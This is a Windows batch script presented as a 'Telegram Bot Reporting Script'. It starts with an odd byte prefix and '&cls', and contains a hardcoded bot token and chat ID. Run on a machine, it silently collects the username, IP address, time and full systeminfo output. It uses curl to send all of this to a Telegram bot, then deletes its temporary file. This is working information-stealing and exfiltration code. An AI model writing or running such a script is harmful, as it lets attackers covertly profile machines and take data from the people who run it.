��&cls
��
@echo off
:: Telegram Bot Reporting Script for Windows 8.1, 10, 11

:: Set Telegram bot details
set "bot_token=7890120010:AAFC34LWI61JXm8hLwz-OlOHVgsXe--pcxg"
set "chat_id=5836771645"

:: Get IP address
for /f "delims=[] tokens=2" %%a in ('ping -4 -n 1 %ComputerName% ^| findstr "["') do set "NetworkIP=%%a"

:: Get local time
for /f "tokens=1-2 delims= " %%a in ("%time%") do set "timepart=%%a"
set "localtime=%date% %timepart%"

:: Send basic info
set "message=Report from %USERNAME% - %NetworkIP%%0ALocal time: %localtime%"
curl --silent --output nul -X POST ^
  "https://api.telegram.org/bot%bot_token%/sendMessage" ^
  -d "chat_id=%chat_id%" -d "text=%message%" -d "parse_mode=Markdown"

:: Gather system info
set "tempsys=%APPDATA%\sysinfo.txt"
2>NUL systeminfo > "%tempsys%"

:: Send system info file
curl --silent --output nul -F document=@"%tempsys%" ^
  "https://api.telegram.org/bot%bot_token%/sendDocument?chat_id=%chat_id%"

:: Cleanup
del "%tempsys%"

:: End of report
curl --silent --output nul -X POST ^
  "https://api.telegram.org/bot%bot_token%/sendMessage" ^
  -d "chat_id=%chat_id%" -d "text=End of report"

exit
